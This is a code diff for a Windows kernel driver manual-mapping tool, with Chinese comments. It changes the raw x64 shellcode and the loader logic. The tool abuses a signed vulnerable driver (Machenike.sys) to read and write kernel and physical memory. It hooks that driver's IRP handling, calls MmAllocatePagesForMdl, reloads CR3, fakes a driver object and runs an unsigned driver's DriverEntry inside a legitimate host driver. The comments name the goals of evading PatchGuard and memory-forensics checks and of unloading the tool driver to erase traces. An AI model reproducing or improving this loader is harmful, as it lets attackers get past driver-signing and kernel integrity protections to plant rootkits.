@@ -215,61 +215,49 @@ struct ShellcodeParams {
 static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exactly 120 bytes (0x78)");
 
 // ================================================================
-// 纯游离物理内存分配探针 Shellcode（x64，100 字节）
+// 纯游离物理内存分配探针 Shellcode（x64，59 字节）
 // 触发后调用 MmAllocatePagesForMdl(Low=0, High=0xFFFFFFFFFF, Skip=0, TotalBytes=imageSize)
 // 申请脱离系统虚拟地址池的纯物理页，将返回的 PMDL 存入 params->allocatedPoolVA，
-// 寄存器安全：完整保存并恢复调用者的所有非易失性及易失性寄存器，严格平栈返回
+// 寄存器安全：完整保存并恢复所有寄存器，设置 ebx=0 并跳回宿主现场 (site.kernVA+5)
+// 严格复用宿主原生 IRP 状态提交流程，零栈偏移假设，零只读写入违例
 // ================================================================
 static const uint8_t scAllocMdlProbe[] = {
     0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
     0x41, 0x5B,                                           // pop r11
-    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D (r11 = params)
+    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D (r11 = params, 120 + 5 = 125 = 0x7D)
     0x53,                                                 // push rbx
     0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params)
     0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16字节对齐)
     // --- Call MmAllocatePagesForMdl(LowAddress, HighAddress, SkipBytes, TotalBytes) ---
     0x48, 0x31, 0xC9,                                     // xor rcx, rcx (LowAddress = 0)
-    0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, // mov rdx, 0x000000FFFFFFFFFF (HighAddress = 0xFFFFFFFFFF)
+    0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, // mov rdx, 0x000000FFFFFFFFFF (HighAddress)
     0x4D, 0x31, 0xC0,                                     // xor r8, r8 (SkipBytes = 0)
     0x44, 0x8B, 0x4B, 0x20,                               // mov r9d, [rbx + 0x20] (TotalBytes = imageSize)
     0xFF, 0x13,                                           // call qword ptr [rbx] (MmAllocatePagesForMdl)
-    0x48, 0x89, 0x43, 0x40,                               // mov [rbx + 0x40], rax (allocatedPoolVA = pMdl)
-    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
-    // --- Self-Complete IRP & Flat Ret ---
-    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (pIrp)
-    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (STATUS_SUCCESS)
-    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (Information = 0)
-    0x31, 0xD2,                                           // xor edx, edx
-    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28
-    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest)
-    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
-    0x5B,                                                 // pop rbx
-    0x31, 0xC0,                                           // xor eax, eax (STATUS_SUCCESS)
-    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70
-    0x41, 0x5F,                                           // pop r15
-    0x41, 0x5E,                                           // pop r14
-    0x41, 0x5D,                                           // pop r13
-    0x41, 0x5C,                                           // pop r12
-    0x5F,                                                 // pop rdi
-    0x5E,                                                 // pop rsi
-    0x5B,                                                 // pop rbx
-    0xC3                                                  // ret
+    0x48, 0x89, 0x43, 0x40,                               // mov [rbx + 0x40], rax (allocatedMdlVA = pMdl)
+    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28 (释放影子栈)
+    0x4C, 0x8B, 0x5B, 0x48,                               // mov r11, [rbx + 0x48] (hookReturnVA = site.kernVA + 5)
+    0x5B,                                                 // pop rbx (恢复宿主原始 rbx，rsp 严格回到进入 Shellcode 时的位置)
+    0x48, 0x8B, 0x7C, 0x24, 0x38,                         // mov rdi, [rsp + 0x38] (替宿主装载栈上备份的 DeviceExtension)
+    0x31, 0xDB,                                           // xor ebx, ebx (设置 NTSTATUS = STATUS_SUCCESS，宿主将 ebx 存入 Irp 并完成)
+    0x41, 0xFF, 0xE3                                      // jmp r11 (平稳跳回宿主驱动现场 site.kernVA + 5)
 };
 static const size_t scAllocMdlProbe_size = sizeof(scAllocMdlProbe);
 
 // ================================================================
 // Direct Execute Shellcode（x64）
-// 专用于 PTE Remap 方案：代码与 .pdata 已预先物理就绪于宿主内部，
-// 此 Shellcode 刷新 TLB -> 构造 fakeDriverObj -> 调用宿主内 DriverEntry -> 平稳返回
-// 寄存器安全：完整保存并恢复所有非易失性寄存器（包括 rbx）
+// 专用于 PTE Remap / Pool 加载方案：
+// 此 Shellcode 刷新 TLB -> 构造 fakeDriverObj -> 调用宿主内 DriverEntry -> 跳回宿主完成 IRP
+// 寄存器安全：完整保存并恢复所有非易失性寄存器（rsi, rdi, r12..r15），
+// 将 DriverEntry 返回状态存入 ebx，替宿主装载 rdi，跳回宿主现场 (site.kernVA+5) 平稳完成 IRP
 // ================================================================
 static const uint8_t scDirectExec[] = {
     0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
     0x41, 0x5B,                                           // pop r11
-    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D
-    0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push rbx, rsi, rdi, r12..r15
+    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D (r11 = params)
+    0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push rbx, rsi, rdi, r12..r15 (7*8 = 56 bytes, 0x38)
     0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params)
-    0x48, 0x81, 0xEC, 0xB8, 0x01, 0x00, 0x00,             // sub rsp, 0x1B8
+    0x48, 0x81, 0xEC, 0x48, 0x02, 0x00, 0x00,             // sub rsp, 0x248 (584 bytes; 56+584 = 640 = 0x280, 严格满足 x64 ABI 16字节对齐)
     0x0F, 0x20, 0xD8,                                     // mov rax, cr3
     0x0F, 0x22, 0xD8,                                     // mov cr3, rax (flush TLB)
     0x48, 0x8D, 0x7C, 0x24, 0x40,                         // lea rdi, [rsp + 0x40]
@@ -280,44 +268,30 @@ static const uint8_t scDirectExec[] = {
     0x5F,                                                 // pop rdi
     0x66, 0xC7, 0x07, 0x04, 0x00,                         // mov word ptr [rdi], 4
     0x66, 0xC7, 0x47, 0x02, 0x50, 0x01,                   // mov word ptr [rdi + 2], 0x150
-    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
-    0x48, 0x89, 0x47, 0x08,                               // mov [rdi + 8], rax
-    0x48, 0x8B, 0x43, 0x50,                               // mov rax, [rbx + 0x50]
-    0x48, 0x89, 0x47, 0x18,                               // mov [rdi + 0x18], rax
-    0x8B, 0x43, 0x58,                                     // mov eax, [rbx + 0x58]
-    0x89, 0x47, 0x20,                                     // mov [rdi + 0x20], eax
-    0x48, 0x8B, 0x43, 0x5C,                               // mov rax, [rbx + 0x5C]
-    0x48, 0x89, 0x47, 0x28,                               // mov [rdi + 0x28], rax
-    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
-    0x48, 0x8D, 0x53, 0x64,                               // lea rdx, [rbx + 0x64]
-    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
-    0x48, 0x63, 0x4B, 0x24,                               // movsxd rcx, dword ptr [rbx + 0x24]
-    0x48, 0x01, 0xC8,                                     // add rax, rcx
-    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
-    0xFF, 0xD0,                                           // call rax
-    0x89, 0x43, 0x3C,                                     // mov [rbx + 0x3C], eax
-    0x48, 0x81, 0xC4, 0xB8, 0x01, 0x00, 0x00,             // add rsp, 0x1B8
+    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18] (userImageVA)
+    0x48, 0x89, 0x47, 0x08,                               // mov [rdi + 8], rax (DeviceObject = poolVA)
+    0x48, 0x8B, 0x43, 0x50,                               // mov rax, [rbx + 0x50] (whqlDrvBase)
+    0x48, 0x89, 0x47, 0x18,                               // mov [rdi + 0x18], rax (DriverStart)
+    0x8B, 0x43, 0x58,                                     // mov eax, [rbx + 0x58] (whqlDrvSize)
+    0x89, 0x47, 0x20,                                     // mov [rdi + 0x20], eax (DriverSize)
+    0x48, 0x8B, 0x43, 0x5C,                               // mov rax, [rbx + 0x5C] (whqlLdrEntryVA)
+    0x48, 0x89, 0x47, 0x28,                               // mov [rdi + 0x28], rax (DriverSection)
+    0x48, 0x89, 0xF9,                                     // mov rcx, rdi (pDriverObj)
+    0x48, 0x8D, 0x53, 0x64,                               // lea rdx, [rbx + 0x64] (&bootConfig)
+    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18] (kernelImageVA)
+    0x48, 0x63, 0x4B, 0x24,                               // movsxd rcx, dword ptr [rbx + 0x24] (EntryPointOffset)
+    0x48, 0x01, 0xC8,                                     // add rax, rcx (DriverEntry VA)
+    0x48, 0x89, 0xF9,                                     // mov rcx, rdi (rcx = fakeDriverObj)
+    0xFF, 0xD0,                                           // call rax (call DriverEntry)
+    0x89, 0x43, 0x3C,                                     // mov [rbx + 0x3C], eax (params->status = eax)
+    0x48, 0x81, 0xC4, 0x48, 0x02, 0x00, 0x00,             // add rsp, 0x248 (释放栈空间，恢复 16 字节对齐)
+    0x4C, 0x8B, 0x5B, 0x48,                               // mov r11, [rbx + 0x48] (hookReturnVA = site.kernVA + 5)
+    0x8B, 0x5B, 0x3C,                                     // mov ebx, [rbx + 0x3C] (直接从参数块读取状态码，彻底不碰 rbp)
     0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,       // pop r15, r14, r13, r12
-    0x5F, 0x5E,                                           // pop rdi, rsi (保留 rbx 保存 params 指针)
-    // --- Self-Complete IRP & Flat Ret ---
-    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (栈上有 push rbx，真实 pIrp 在 [rsp+0xC0])
-    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (pIrp->IoStatus.Status = STATUS_SUCCESS)
-    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (pIrp->IoStatus.Information = 0)
-    0x31, 0xD2,                                           // xor edx, edx (PriorityBoost = 0)
-    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16 字节栈对齐)
-    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest，rbx 稳定非易失)
-    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
-    0x5B,                                                 // pop rbx (恢复调用者的 rbx，此时 rsp 完全回到 rsp_host)
-    0x31, 0xC0,                                           // xor eax, eax (return STATUS_SUCCESS)
-    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70 (平掉 Machenike 入口分配的 0x70 栈帧)
-    0x41, 0x5F,                                           // pop r15
-    0x41, 0x5E,                                           // pop r14
-    0x41, 0x5D,                                           // pop r13
-    0x41, 0x5C,                                           // pop r12
-    0x5F,                                                 // pop rdi
-    0x5E,                                                 // pop rsi
-    0x5B,                                                 // pop rbx (恢复 Machenike 入口压栈的 7 个寄存器)
-    0xC3                                                  // ret (平稳返回 nt!IofCallDriver 调用方)
+    0x5F, 0x5E,                                           // pop rdi, rsi
+    0x58,                                                 // pop rax (弹出并丢弃旧 rbx，rsp 彻底回到进入 Shellcode 时的位置)
+    0x48, 0x8B, 0x7C, 0x24, 0x38,                         // mov rdi, [rsp + 0x38] (替宿主装载栈上备份的 DeviceExtension)
+    0x41, 0xFF, 0xE3                                      // jmp r11 (平稳跳回宿主驱动现场 site.kernVA + 5)
 };
 static const size_t scDirectExec_size = sizeof(scDirectExec);
 
@@ -425,24 +399,47 @@ static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint3
         }
     }
 
-    // 2. 兼容检查 DOS 保留区偏移 0x28
-    if (ReadKernelVA(hDev, cr3, drvBase + 0x28, &canary, sizeof(canary))) {
-        if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
-            LOG_OK("================================================================");
-            LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' (offset 0x28)!", drvName);
-            LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
-                   canary.KernelImageVA, canary.ImageSize);
-            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
-            LOG_OK("================================================================");
-            return true;
+    // 2. 检查宿主驱动内部 Discardable / INIT / .reloc 节区首部的 Canary 暗桩（零白驱动 PE 头修改）
+    if (drvOrigSize > 0) {
+        uint8_t hdrBuf[0x1000] = {};
+        if (ReadKernelVA(hDev, cr3, drvBase, hdrBuf, sizeof(hdrBuf))) {
+            auto* dos = (IMAGE_DOS_HEADER*)hdrBuf;
+            if (dos->e_magic == IMAGE_DOS_SIGNATURE &&
+                dos->e_lfanew < (LONG)(sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64)))
+            {
+                auto* nt = (IMAGE_NT_HEADERS64*)(hdrBuf + dos->e_lfanew);
+                if (nt->Signature == IMAGE_NT_SIGNATURE) {
+                    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+                        auto* s = &IMAGE_FIRST_SECTION(nt)[i];
+                        uint32_t rva = s->VirtualAddress;
+                        if (rva == 0 || rva >= drvOrigSize) continue;
+
+                        DRV_WSK_CANARY secCanary = {};
+                        if (ReadKernelVA(hDev, cr3, drvBase + rva, &secCanary, sizeof(secCanary))) {
+                            if (secCanary.Magic == DRV_WSK_CANARY_MAGIC) {
+                                char sName[9] = {};
+                                memcpy(sName, s->Name, 8);
+                                LOG_OK("================================================================");
+                                LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' section '%s' (RVA=0x%X)!",
+                                       drvName, sName, rva);
+                                LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
+                                       secCanary.KernelImageVA, secCanary.ImageSize);
+                                LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
+                                LOG_OK("================================================================");
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
 
-    // 3. 方案 5：快速扫描纯游离物理页窗口 [256MB ~ 512MB] 的 GUID 签名暗桩 (彻底免疫 PatchGuard 0x109)
+    // 3. 方案 5：快速扫描纯游离物理页窗口 [256MB ~ 1GB] 的 GUID 签名暗桩 (彻底免疫 PatchGuard 0x109)
     {
         static const GUID targetGuid = { DRV_CANARY_GUID_D1, DRV_CANARY_GUID_D2, DRV_CANARY_GUID_D3, DRV_CANARY_GUID_D4 };
         uint8_t probeBuf[sizeof(DRV_WSK_CANARY)] = {};
-        for (uint64_t pa = DRV_CANARY_WINDOW_LOW; pa < DRV_CANARY_WINDOW_HIGH; pa += 0x1000) {
+        for (uint64_t pa = DRV_CANARY_WINDOW_LOW; pa < 0x40000000ULL; pa += 0x1000) {
             if (WhqlReadPhys(hDev, pa, probeBuf, sizeof(probeBuf))) {
                 PDRV_WSK_CANARY pProbe = (PDRV_WSK_CANARY)probeBuf;
                 if (pProbe->Magic == DRV_WSK_CANARY_MAGIC &&
@@ -637,25 +634,7 @@ static uint32_t FindHostInternalCave(
     // 那些区域承载着系统驱动的正在运行的代码和数据，覆写会导致 0x1E / 0x3B 蓝屏。
     // 大容量载荷统一走方案 A（PTE Remap 挂接引擎）。
 
-    // --- 策略 1：原生常驻可丢弃/初始化节区原位复用 (In-Place Discardable/INIT Resident Section) ---
-    // 优先借用宿主驱动自身已经分配并常驻物理页的 INIT 或 DISCARDABLE 节区，
-    // 其底层物理页归宿主驱动原生合法所有（MMPFN.PteAddress 正确、PrototypePte 合规、零 Pool 记录），
-    // 从根本上消除 Ghost Pool 与 PFN 孤儿页检测特征！
-    for (WORD i = 0; i < nSec; i++) {
-        char secName[9] = {};
-        memcpy(secName, sec[i].Name, 8);
-        uint32_t secRVA     = sec[i].VirtualAddress;
-        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
-        bool isDiscardable  = ((sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0) || (_strnicmp(secName, "INIT", 4) == 0);
-
-        if (isDiscardable && vSize >= neededBytes && secRVA + neededBytes <= hostOrigSize) {
-            if (ArePagesPresent(hDev, cr3, hostDrvBase + secRVA, neededBytes)) {
-                LOG_OK("FindHostInternalCave[%s]: [Strategy 1 In-Place] selected resident Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X, pages verified)",
-                       hostDrvNameA, secName, secRVA, vSize);
-                return secRVA;
-            }
-        }
-    }
+    // 提示：大容量载荷（>= 4KB）统一走方案 A（PTE Remap 挂接引擎），严禁原位覆写宿主原生常驻物理页以防践踏宿主内部线程数据结构。
 
     // --- 策略 2：节区末尾页间隙（VirtualSize 到 AlignedVirtualSize 之间，物理页存在）---
     for (WORD i = 0; i < nSec; i++) {
@@ -1051,6 +1030,13 @@ static bool InjectPayloadIntoHost(
     LOG_OK("InjectPayloadIntoHost: payload written to host VA=0x%016llX (0x%X bytes)",
            payloadTargetVA, payloadImg.SizeOfImage);
 
+    // --- 5. 在 payload 自身已清零的头部记录 Canary 结构（宿主常驻，无需污染宿主 PE 头）---
+    DRV_WSK_CANARY canary = {};
+    canary.Magic = DRV_WSK_CANARY_MAGIC;
+    canary.KernelImageVA = payloadTargetVA;
+    canary.ImageSize = payloadImg.SizeOfImage;
+    WriteKernelVA(hDev, cr3, payloadTargetVA, &canary, sizeof(canary));
+
     outPayloadKernVA = payloadTargetVA;
     return true;
 }
@@ -1128,12 +1114,18 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
             }
             if (foundPref && CheckDriverCanary(hDev, cr3, prefBase, prefSize, preferredHostDrvName)) {
                 CloseHandle(hDev);
+                hDev = INVALID_HANDLE_VALUE;
+                LOG_INFO("LoadDrvWsk: Core driver already active, unloading '%ls' tool driver...", triggerDrvName);
+                UnloadWhqlDriver(triggerDrvName);
                 return true;
             }
         }
         // 再检查触发驱动 (Machenike.sys)
         if (CheckDriverCanary(hDev, cr3, triggerDrvBase, triggerDrvSize, triggerDrvName)) {
             CloseHandle(hDev);
+            hDev = INVALID_HANDLE_VALUE;
+            LOG_INFO("LoadDrvWsk: Core driver already active, unloading '%ls' tool driver...", triggerDrvName);
+            UnloadWhqlDriver(triggerDrvName);
             return true;
         }
     } else {
@@ -1314,22 +1306,30 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     VirtualUnlock(img.Image.data(), img.Image.size());
 
     if (!ioOk) {
+        if (gle == ERROR_SHARING_VIOLATION || gle == 32) {
+            LOG_OK("================================================================");
+            LOG_OK("[+] Core driver (drv_wsk) is ALREADY ACTIVE (Transport port conflict GLE=32)!");
+            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
+            LOG_OK("================================================================");
+            CloseHandle(hDev);
+            hDev = INVALID_HANDLE_VALUE;
+            LOG_INFO("LoadDrvWsk: Unloading '%ls' tool driver...", triggerDrvName);
+            UnloadWhqlDriver(triggerDrvName);
+            return true;
+        }
         LOG_ERR("LoadDrvWsk: Shellcode execution failed or returned error (GLE=%u)", gle);
         CloseHandle(hDev);
+        hDev = INVALID_HANDLE_VALUE;
+        UnloadWhqlDriver(triggerDrvName);
         return false;
     }
 
-    // ---- 14. 方案 1：写入内核物理暗桩标记到合法空闲对齐区，避免污染 PE 头部 ----
-    DRV_WSK_CANARY canary = {};
-    canary.Magic = DRV_WSK_CANARY_MAGIC;
-    canary.KernelImageVA = payloadKernVA;
-    canary.ImageSize = (uint32_t)img.SizeOfImage;
-
-    WriteKernelVA(hDev, cr3, triggerDrvBase + 0x28, &canary, sizeof(canary));
-    LOG_OK("LoadDrvWsk: Kernel canary recorded into trigger driver (Magic=0x%016llX at 0x%016llX+0x28)",
-           canary.Magic, triggerDrvBase);
-
     CloseHandle(hDev);
+    hDev = INVALID_HANDLE_VALUE;
+
+    // ---- 14. 核心驱动启动成功，立即卸载 Machenike.sys 工具驱动抹除内核痕迹 ----
+    LOG_INFO("LoadDrvWsk: Core driver running successfully, unloading '%ls' tool driver...", triggerDrvName);
+    UnloadWhqlDriver(triggerDrvName);
 
     LOG_OK("LoadDrvWsk: drv_wsk mapped and initialized successfully (Host: %ls, Size: 0x%X)!",
            actualHostName, hostDrvSize);
